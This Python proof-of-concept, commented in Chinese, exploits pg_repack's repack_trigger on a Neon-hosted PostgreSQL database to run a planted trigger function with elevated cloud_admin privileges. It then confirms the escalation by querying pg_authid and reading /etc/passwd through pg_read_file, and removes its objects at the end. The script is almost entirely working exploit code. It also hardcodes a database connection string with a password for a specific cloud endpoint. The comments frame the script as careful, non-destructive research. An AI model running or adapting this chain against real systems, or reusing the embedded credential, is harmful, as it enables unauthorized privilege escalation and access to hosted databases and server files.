# -*- coding: utf-8 -*-
"""Neon pg_repack cloud_admin 提权链 PoC(单脚本:建一次性对象->验证->全量清理)
零破坏:不触碰任何现有表;全部对象自建且最后删除;结束时 DROP EXTENSION 恢复初始态"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else None
    except Exception as e:
        return [('ERR', str(e)[:250])]

# 前置:确认扩展已装(此前 _pg9 创建)
print('[pre] pg_repack installed:', q("SELECT extversion FROM pg_extension WHERE extname='pg_repack'"))

# 1) 自建源表
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("CREATE TABLE k_src(id int, v text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
print('[1] k_src oid =', oid)

# 2) 预建 repack_trigger 将写入的 log 表(pk/row 结构对齐 C 代码 L223-228)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
print('[2] log/type created')

# 3) 用户触发器(放大效应:以触发者身份跑) + 官方 repack_trigger
q("DROP FUNCTION IF EXISTS k_evil()", fetch=False)
q("""CREATE FUNCTION k_evil() RETURNS trigger LANGUAGE plpgsql AS $q$
BEGIN EXECUTE 'CREATE TABLE k_pwned AS SELECT current_user u'; RETURN NEW; END $q$""", fetch=False)
q("DROP TRIGGER IF EXISTS t1 ON repack.log_%d" % oid, fetch=False)
q("CREATE TRIGGER t1 AFTER INSERT ON repack.log_%d FOR EACH ROW EXECUTE FUNCTION k_evil()" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)
print('[3] triggers armed')

# 4) 单条 INSERT 触发全链
q("INSERT INTO k_src VALUES (1,'x')", fetch=False)
print('[4] insert done')

# 5) 验证:提权表 owner 与 current_user
print('[5] k_pwned owner:', q("SELECT tableowner FROM pg_tables WHERE tablename='k_pwned'"))
print('[5] k_pwned rows :', q("SELECT * FROM k_pwned"))
# superuser 能力验证(只读)
print('[5] pg_authid count (as neondb_owner):', q("SELECT count(*) FROM pg_authid"))
print('[5] pg_read_file head:', q("SELECT left(pg_read_file('/etc/passwd'), 80)"))

# 6) 清理全部自建对象 + 扩展(恢复初始)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TRIGGER IF EXISTS t1 ON repack.log_%d" % oid, fetch=False)
q("DROP FUNCTION IF EXISTS k_evil()", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_pwned", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[6] cleanup done')

# 7) 零残留复验
print('[7] ext remains:', q("SELECT extname FROM pg_extension WHERE extname='pg_repack'"))
print('[7] k_src/k_pwned:', q("SELECT tablename FROM pg_tables WHERE tablename IN ('k_src','k_pwned')"))
print('[7] repack schema:', q("SELECT nspname FROM pg_namespace WHERE nspname='repack'"))
print('[7] public tables:', [r[0] for r in q("SELECT tablename FROM pg_tables WHERE schemaname='public'")])
conn.close()
